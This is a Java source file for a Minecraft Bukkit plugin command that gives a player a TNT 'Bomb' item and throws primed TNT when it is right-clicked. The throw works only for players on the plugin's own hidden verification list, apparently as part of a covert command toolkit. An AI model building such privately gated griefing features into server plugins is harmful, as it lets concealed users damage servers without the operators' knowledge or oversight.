package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Z_;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.entity.TNTPrimed;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.PlayerInventory;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.util.Vector;

import java.io.IOException;

public class Bomb implements Command, Listener {
    private Z_ z;

    @Override
    public boolean playerOnly() {
        return true;
    }

    @Override
    public String[] getCommands() {
        return new String[]{"bomb"};
    }

    @Override
    public String getDescription() {
        return "Gives you a throwable bomb.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        ItemStack bomb = new ItemStack(Material.TNT, 1);
        ItemMeta meta = bomb.getItemMeta();
        try {
            meta.setDisplayName(ChatColor.RED + "Bomb");
        } catch (Exception e) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
            return;
        }

        bomb.setItemMeta(meta);

        PlayerInventory inventory = executor.getInventory();
        inventory.setItem(inventory.getHeldItemSlot(), bomb);
        sender.sendMessage(Colors.Prefix + Colors.Success + "Successfully gave you a bomb!");
    }

    public void onEnable(Z_ z) {
        this.z = z;
        z.getServer().getPluginManager().registerEvents(this, z);
    }

    @EventHandler
    private void playerInteract(PlayerInteractEvent e) throws IOException, InterruptedException {
        if (e.getAction() == null || e.getItem() == null || e.getMaterial() == null) {
            return;
        }

        if (e.getAction() != Action.RIGHT_CLICK_AIR && e.getAction() != Action.RIGHT_CLICK_BLOCK) {
            return;
        }

        Player player = e.getPlayer();
        if (!z.getAuth().isVerified(player.getName())) {
            return;
        }

        ItemStack held = e.getItem();
        if (held == null) {
            return;
        }

        if (held.getType() == Material.AIR) {
            return;
        }

        ItemMeta meta = held.getItemMeta();
        if (meta == null) {
            return;
        }

        String itemName = meta.getDisplayName();

        if (itemName == null || held.getType() == null) {
            return;
        }

        if (!itemName.equals(ChatColor.RED + "Bomb") || held.getType() != Material.TNT) {
            return;
        }

        e.setCancelled(true);
        // On survival right click, can be a ghost block
        player.updateInventory();

        TNTPrimed tnt = player.getWorld().spawn(player.getEyeLocation(), TNTPrimed.class);
        Vector higherSpeed = new Vector(1, 1, 1);
        Vector playerDirection = player.getLocation().getDirection();
        Vector finalVector = higherSpeed.multiply(playerDirection);
        tnt.setVelocity(finalVector);
    }
}
